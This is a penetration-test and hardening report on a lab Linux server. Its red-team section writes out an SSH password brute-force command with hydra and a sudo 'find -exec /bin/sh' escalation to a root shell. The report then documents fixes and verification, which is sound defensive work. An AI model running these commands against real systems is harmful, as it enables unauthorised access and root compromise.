# Linux Server Assessment & Hardening: srv01

| | |
|---|---|
| **Engagement** | Host security assessment + remediation (lab exercise) |
| **Target** | `srv01` (10.10.20.10), Debian Linux, SSH exposed |
| **Tester** | Mahmod Aldahol |
| **Date** | 2026-11-04 |
| **Classification** | Confidential |

> Lab exercise on an isolated Docker network owned by the tester. Values (passwords, flag) are from this test run.

---

## 1. Executive summary
An attacker with only network access to `srv01` achieved **full root compromise in two steps**: a weak SSH
password was guessed by automated tool in seconds, and a misconfigured `sudo` rule let that account become root.
A third issue exposed all password hashes to every user. **Overall risk before remediation: Critical.**

The host was then hardened: SSH moved to key-only authentication, root login disabled, login attempts limited,
the dangerous `sudo` rule removed, and file permissions corrected. After remediation the original attack chain no
longer works (the password attack is refused outright).

---

## 2. Attack chain (red team)

```
weak SSH password  --hydra-->  shell as 'deploy'  --sudo find-->  root  -->  /etc/shadow readable by all
```

### 2.1 Reconnaissance
```bash
nmap -sV 10.10.20.10        # 22/tcp open, OpenSSH
```

### 2.2 Credential attack (F1)
```bash
hydra -l deploy -P /root/wordlists/common-passwords.txt ssh://10.10.20.10 -t 4
# [22][ssh] host: 10.10.20.10  login: deploy  password: monkey
```
The password was recovered in ~13 seconds. This is an **online** attack: every guess hits the live server.

### 2.3 Privilege escalation (F2)
```bash
ssh deploy@10.10.20.10
sudo -l
#   (root) NOPASSWD: /usr/bin/find
sudo find . -maxdepth 0 -exec /bin/sh \;   # GTFOBins technique -> root shell
cat /root/flag.txt                          # FLAG{root_...}
```
`find` can execute arbitrary commands via `-exec`; run as root through sudo, it yields a root shell.

### 2.4 Information disclosure (F3)
```bash
ls -l /etc/shadow      # -rw-r--r-- : world-readable (should be 640)
```
Any user could copy all password hashes and crack them **offline**, invisibly.

---

## 3. Findings

| ID | Finding | Risk |
|----|---------|------|
| F1 | Weak, guessable SSH password on service account `deploy` | **High** |
| F2 | `sudo` NOPASSWD rule on `/usr/bin/find` allows privilege escalation to root | **Critical** |
| F3 | `/etc/shadow` world-readable, exposing all password hashes | **High** |

### F1 — Weak SSH password (High)
**Impact:** Direct, unauthenticated-to-authenticated access. Service accounts are prime targets because their
passwords rarely change and logins go unnoticed.
**Fix applied:** SSH password authentication disabled (key-only); login attempts limited to 3 per connection.

### F2 — Dangerous sudo rule (Critical)
**Impact:** Full root compromise from any `deploy` session. The flaw is the rule, not `find`; any program that can
spawn a shell or run commands (vim, less, python, tar, awk…) is equivalent to granting root. See GTFOBins.
**Fix applied:** Removed `/etc/sudoers.d/deploy`. Verified with `sudo -l -U deploy` and `visudo -c`.

### F3 — World-readable /etc/shadow (High)
**Impact:** Enables offline cracking of every account's password with no rate limit or alerting.
**Fix applied:** `chmod 640 /etc/shadow` (owner root, group shadow).

---

## 4. Remediation (blue team) & verification

| # | Action | Verification |
|---|--------|--------------|
| 1 | Generate key pair on client; install public key for `deploy` | `ssh deploy@10.10.20.10` logs in without a password |
| 2 | `PasswordAuthentication no` + reload sshd | `ssh -o PubkeyAuthentication=no` → *Permission denied (publickey)* |
| 3 | `PermitRootLogin no` | `sshd -T \| grep permitrootlogin` → `no` |
| 4 | `MaxAuthTries 3` | `sshd -T \| grep maxauthtries` → `3` |
| 5 | Remove `/etc/sudoers.d/deploy` | `sudo -l -U deploy` no longer lists `find` |
| 6 | `chmod 640 /etc/shadow` | `ls -l /etc/shadow` → `-rw-r-----` |

**Before/after evidence:** before hardening, hydra recovered the password. After hardening:
```
[ERROR] target ssh://10.10.20.10:22/ does not support password authentication (method reply 4).
```
_(Insert your terminal screenshot of hydra failing here.)_

**SSH change-management note:** all SSH config changes were made with a second root session open and validated with
`sshd -t` before reload, to avoid lockout — standard practice for remote administration.

---

## 5. Lessons learned
- **Low-rated issues chain into critical ones.** A weak password plus one sudo rule equals total compromise.
- **Least privilege for sudo:** never grant root on a general-purpose binary. If a task needs root, allow a specific,
  root-owned script that the user cannot modify.
- **Keys over passwords:** key authentication removes the entire online-guessing attack surface; the server stores
  only the public key, useless to an attacker who steals it.
- **Defense in depth:** the fixes address authentication, authorization, and data-at-rest independently.
